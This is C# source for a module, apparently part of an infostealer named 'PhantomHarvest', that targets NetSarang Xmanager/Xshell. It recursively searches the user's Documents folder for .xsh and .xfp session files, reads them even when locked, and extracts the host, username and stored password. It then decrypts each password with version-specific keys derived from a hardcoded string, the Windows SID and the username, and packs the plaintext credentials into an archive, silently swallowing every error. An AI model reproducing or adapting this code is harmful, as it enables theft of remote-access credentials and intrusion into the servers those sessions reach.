using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal static class Xmanager
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				Xmanager.sessionFiles.Clear();
				Xmanager.GetAllAccessibleFiles(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
				
				if (Xmanager.sessionFiles.Count != 0)
				{
					string sessions = Xmanager.DecryptSessions();
					if (!string.IsNullOrEmpty(sessions))
					{
						using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(sessions)))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, Xmanager.ToolName + "/Xmanager.txt", ms, DateTime.Now, "");
						}
					}
				}
			}
			catch
			{
			}
		}

		public static void GetAllAccessibleFiles(string rootPath)
		{
			foreach (DirectoryInfo directoryInfo in new DirectoryInfo(rootPath).GetDirectories())
			{
				try
				{
					Xmanager.GetAllAccessibleFiles(directoryInfo.FullName);
				}
				catch
				{
				}
			}
			foreach (string text in Directory.GetFiles(rootPath))
			{
				if (text.Contains(".xsh") || text.Contains(".xfp"))
				{
					Xmanager.sessionFiles.Add(text);
				}
			}
		}

		public static string DecryptSessions()
		{
			StringBuilder stringBuilder = new StringBuilder();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string text = current.User.ToString();
			string text2 = current.Name.Split(new char[]
			{
				'\\'
			})[1];
			foreach (string text3 in Xmanager.sessionFiles)
			{
				List<string> list = Xmanager.ReadConfigFile(text3);
				if (list.Count >= 4)
				{
					stringBuilder.AppendLine("Session File: " + text3);
					stringBuilder.Append("Version: " + list[0]);
					stringBuilder.Append("Host: " + list[1]);
					stringBuilder.Append("UserName: " + list[2]);
					stringBuilder.Append("rawPass: " + list[3]);
					stringBuilder.AppendLine("UserName: " + text2);
					stringBuilder.AppendLine("Sid: " + text);
					stringBuilder.AppendLine(Xmanager.Decrypt(text2, text, list[3], list[0].Replace("\r", "")));
					stringBuilder.AppendLine();
				}
			}
			return stringBuilder.ToString();
		}

		private static List<string> ReadConfigFile(string path)
		{
			string input;
			try
			{
				byte[] bytes = LockedFile.ReadLockedFile(path);
				input = bytes != null ? Encoding.UTF8.GetString(bytes) : File.ReadAllText(path);
			}
			catch { return new List<string>(); }

			string item = null;
			string item2 = null;
			string item3 = null;
			string text = null;
			List<string> list = new List<string>();
			try
			{
				item = Regex.Match(input, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
				item2 = Regex.Match(input, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
				item3 = Regex.Match(input, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
				text = Regex.Match(input, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
			}
			catch
			{
			}
			list.Add(item);
			list.Add(item2);
			list.Add(item3);
			if (text.Length > 3)
			{
				list.Add(text);
			}
			return list;
		}

		private static string Decrypt(string username, string sid, string rawPass, string ver)
		{
			if (ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2"))
			{
				byte[] array = Convert.FromBase64String(rawPass);
				byte[] key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));
				byte[] array2 = new byte[array.Length - 32];
				Array.Copy(array, 0, array2, 0, array.Length - 32);
				byte[] bytes = RC4Crypt.Decrypt(key, array2);
				return "Decrypt rawPass: " + Encoding.ASCII.GetString(bytes);
			}
			if (ver.StartsWith("5.1") || ver.StartsWith("5.2"))
			{
				byte[] array3 = Convert.FromBase64String(rawPass);
				byte[] key2 = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid));
				byte[] array4 = new byte[array3.Length - 32];
				Array.Copy(array3, 0, array4, 0, array3.Length - 32);
				byte[] bytes2 = RC4Crypt.Decrypt(key2, array4);
				return "Decrypt rawPass: " + Encoding.ASCII.GetString(bytes2);
			}
			if (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0"))
			{
				byte[] array5 = Convert.FromBase64String(rawPass);
				byte[] key3 = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username + sid));
				byte[] array6 = new byte[array5.Length - 32];
				Array.Copy(array5, 0, array6, 0, array5.Length - 32);
				byte[] bytes3 = RC4Crypt.Decrypt(key3, array6);
				return "Decrypt rawPass: " + Encoding.ASCII.GetString(bytes3);
			}
			if (ver.StartsWith("7"))
			{
				string s = new string((new string(username.ToCharArray().Reverse<char>().ToArray<char>()) + sid).ToCharArray().Reverse<char>().ToArray<char>());
				byte[] array7 = Convert.FromBase64String(rawPass);
				byte[] key4 = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(s));
				byte[] array8 = new byte[array7.Length - 32];
				Array.Copy(array7, 0, array8, 0, array7.Length - 32);
				byte[] bytes4 = RC4Crypt.Decrypt(key4, array8);
				return "Decrypt rawPass: " + Encoding.ASCII.GetString(bytes4);
			}
			return "";
		}

		public static string ToolName = "Xmanager";

		public static List<string> sessionFiles = new List<string>();
	}
}
